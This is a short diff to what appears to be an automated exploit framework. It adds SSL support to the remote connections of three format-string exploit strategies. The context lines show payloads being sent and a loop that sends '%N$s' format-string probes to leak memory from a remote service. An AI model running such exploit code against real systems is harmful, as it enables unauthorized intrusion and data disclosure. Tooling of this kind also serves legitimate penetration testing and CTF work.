@@ -312,7 +312,7 @@ class FmtstrX32RemoteStrategy(ExploitStrategy):
 
         print_payload(f"payload: {payload}")
 
-        io = remote(host, port)
+        io = remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.sendline(payload)
 
         buf_addr, offset = _resolve_fmtstr_inputs(ctx)
@@ -392,7 +392,7 @@ class FmtstrX64RemoteStrategy(ExploitStrategy):
 
         print_payload(f"payload: {payload}")
 
-        io = remote(host, port)
+        io = remote(host, port, ssl=ctx.ssl)  # v4.1.11
         io.sendline(payload)
 
         buf_addr, offset = _resolve_fmtstr_inputs(ctx)
@@ -524,7 +524,7 @@ class FmtstrPrintStringsX32RemoteStrategy(ExploitStrategy):
 
         for i in range(LEAK_LOOP_BOUND):
             try:
-                io = remote(host, port)
+                io = remote(host, port, ssl=ctx.ssl)  # v4.1.11
                 io.sendline(f"%{i}$s".encode())
                 result = io.recv()
                 if result and len(result.strip()) > 0:
